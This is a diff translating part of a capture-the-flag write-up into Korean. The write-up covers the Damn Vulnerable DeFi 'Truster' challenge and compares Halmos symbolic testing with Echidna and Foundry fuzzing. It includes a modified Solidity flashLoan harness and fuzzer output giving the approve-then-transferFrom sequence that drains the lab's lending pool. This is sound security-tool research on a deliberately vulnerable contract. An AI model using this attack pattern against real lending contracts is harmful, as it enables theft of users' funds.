+만세! 이 경우, **Echidna**는 불변 조건을 깨는 시퀀스를 실제로 찾았습니다. 하지만 우리는 여전히 퍼저에게 매우 큰 힌트를 주었습니다. 따라서 `flashLoan()` 하에서 수행될 수 있는 모든 가능한 호출을 고려해 봅시다 (적어도 설정에 있는 것들). 신사 숙녀 여러분, 프랑켄슈타인을 만나보세요:
 ```solidity
 function __flashLoan(uint256 amount, address borrower,
                         bool is_token,
@@ -697,7 +711,7 @@ function __flashLoan(uint256 amount, address borrower,
     uint256 balanceBefore = token.balanceOf(address(this));
     
     token.transfer(borrower, amount);
-    //target is token
+    //target이 token
     if (is_token) {
         if (is_approve) {
             token.approve(approve_to, approve_amount);
@@ -714,10 +728,10 @@ function __flashLoan(uint256 amount, address borrower,
             token.transferFrom(transferFrom_from, transferFrom_to, transferFrom_amount);
         }
     }
-    //target is pool
+    //target이 pool
     else {
-        bytes memory data = ""; // The only one function in pool is nonReentrant anyway
-        address(this).functionCall(data); // Call flashloan itself
+        bytes memory data = ""; // 풀에 있는 유일한 함수는 어차피 nonReentrant입니다
+        address(this).functionCall(data); // flashloan 자체를 호출
     }
     if (token.balanceOf(address(this)) < balanceBefore) {
         revert RepayFailed();
@@ -725,7 +739,7 @@ function __flashLoan(uint256 amount, address borrower,
     return true;
 }
 ```
-Of course, it doesn't compile:
+물론 컴파일되지 않습니다:
 ```javascript
 $ forge build
 ...
@@ -733,7 +747,7 @@ Error: Compiler run failed:
 Error: Compiler error (/solidity/libsolidity/codegen/LValue.cpp:51):Stack too deep. ...
 ...
 ```
-But we can rewrite it using the same idea. `permit()` and `flashLoan()` calls are deleted because they are uncallable anyway:
+하지만 동일한 아이디어를 사용하여 다시 작성할 수 있습니다. `permit()`과 `flashLoan()` 호출은 어차피 호출할 수 없으므로 삭제합니다:
 ```solidity
 function __flashLoan(uint256 amount, address borrower,
 		    bool is_approve, bool is_transfer, bool is_tranferFrom,
@@ -762,7 +776,7 @@ function __flashLoan(uint256 amount, address borrower,
 	return true;
 }
 ```
-Run:
+실행:
 ```javascript
 $ forge build
 ...
@@ -773,12 +787,14 @@ echidna_testSolved: failed!
     TrusterLenderPool.__flashLoan(0,0x0,true,false,false,0xcafe0002,0x0,40464368538165944492706300802628728086193014206184318198474034)
     DamnValuableToken.transferFrom(0x62d69f6867a0a084c6d313943dc22023bc263691,0x0,1)
 ```
-It's alive! Well, with such changes, we managed to make fuzzing produce some kind of acceptable result.
-## Conclusions
-1. Sometimes, one transaction is not enough for an attack. Symbolically perform 2 transactions in such tasks generally possible for Halmos.
-2. One of the main conditions for successful preparation of the symbolic test is to make sure that the maximum number of paths is covered. If there is a way to simply increase this number, it should be done!
-3. If the target contract needs some changes, don't be afraid to make them. The main thing is to understand what we are doing so as not to affect the result.
-4. You have to be careful with cryptographic functions, as automatic tools do not handle them well.
-5. Fuzzing in Foundry and Echidna showed itself to be very weak with contracts in which there is a call to the transferred target and the corresponding data. It would seem that it should be simple: take the target from the known ones, build calldata from the selector and the necessary parameters and execute. But these tools did not cope with this. Probably, this is the reason why I did not find any solution to this problem using fuzzing on the Internet. Preparing such a contract for fuzzing looks more like a headache. And here Halmos showed itself as a very convenient tool.
-## What's next?
-The next article in this series is [Naive-receiver](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/naive-receiver) solving.
+살아있다! 자, 이런 변화들로 우리는 퍼징이 어느 정도 허용 가능한 결과를 만들어내도록 관리했습니다.
+
+## 결론
+1. 때로는 공격에 한 번의 트랜잭션으로 충분하지 않습니다. 심볼릭하게 2개의 트랜잭션을 수행하는 것은 일반적으로 Halmos에서 가능합니다.
+2. 심볼릭 테스트를 성공적으로 준비하기 위한 주요 조건 중 하나는 최대 경로 수가 커버되는지 확인하는 것입니다. 이 숫자를 단순히 늘릴 방법이 있다면 그렇게 해야 합니다!
+3. 대상 계약에 변경이 필요하다면 주저하지 말고 변경하세요. 중요한 것은 결과에 영향을 주지 않도록 우리가 무엇을 하고 있는지 이해하는 것입니다.
+4. 자동화 도구는 암호학적 함수를 잘 처리하지 못하므로 주의해야 합니다.
+5. Foundry와 Echidna에서의 퍼징은 전달된 대상과 해당 데이터에 대한 호출이 있는 계약에서 매우 약한 모습을 보였습니다. 알려진 것에서 대상을 가져오고, 선택자와 필요한 매개변수에서 calldata를 구축하고 실행하는 것이 간단할 것 같았습니다. 하지만 이 도구들은 이것에 대처하지 못했습니다. 아마도 이것이 인터넷에서 퍼징을 사용하여 이 문제에 대한 해결책을 찾지 못한 이유일 것입니다. 퍼징을 위해 이러한 계약을 준비하는 것은 골치 아픈 일처럼 보입니다. 그리고 여기서 Halmos는 매우 편리한 도구임이 입증되었습니다.
+
+## 다음 단계는?
+이 시리즈의 다음 글은 [Naive-receiver](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/naive-receiver) 해결입니다.
